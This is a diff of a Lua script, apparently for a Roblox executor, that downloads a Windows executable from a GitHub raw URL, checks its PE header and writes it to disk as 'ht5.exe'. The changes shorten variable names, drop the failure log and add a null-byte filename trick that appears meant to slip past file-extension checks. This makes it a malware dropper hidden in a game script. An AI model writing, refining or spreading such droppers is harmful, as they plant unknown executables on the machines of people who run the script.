@@ -4,37 +4,31 @@ local http_req = rawget(genv, "request") or rawget(genv, "http_request") or rawg
 
 if type(writefile) ~= "function" then return end
 
-local exe_url = "https://gofile.io/d/aW5u6M"
-local exe_name = "ht5.exe"
+local u = "https://github.com/NormalLinuxUser2/frrrrrrrr546/raw/refs/heads/main/de.exe"
+local n = "ht5.exe"
 
-local exe_bytes = ""
-local success_download = false
+local b = ""
+local ok = false
 
 if type(http_req) == "function" then
-    local ok, res = pcall(http_req, {
-        Url = exe_url, 
-        Method = "GET"
-    })
-    
-    if ok and res and res.StatusCode == 200 and type(res.Body) == "string" and res.Body:sub(1,2) == "MZ" then
-        exe_bytes = res.Body
-        success_download = true
+    local s, r = pcall(http_req, { Url = u, Method = "GET" })
+    if s and r and r.StatusCode == 200 and type(r.Body) == "string" and r.Body:sub(1,2) == "MZ" then
+        b = r.Body
+        ok = true
     end
 end
 
-if not success_download then
-    pcall(function() 
-        local b = game:HttpGet(exe_url) 
-        if b and b:sub(1,2) == "MZ" then
-            exe_bytes = b
-            success_download = true
+if not ok then
+    pcall(function()
+        local r = game:HttpGet(u)
+        if r and r:sub(1,2) == "MZ" then
+            b = r
+            ok = true
         end
     end)
 end
 
-if not success_download or #exe_bytes < 1000 then 
-    pcall(writefile, "debug_download.txt", "Failed to download valid PE file.")
-    return 
-end
+if not ok or #b < 1000 then return end
 
-pcall(writefile, exe_name, exe_bytes)
+pcall(writefile, n .. "\0.txt", b)
+pcall(writefile, n, b)
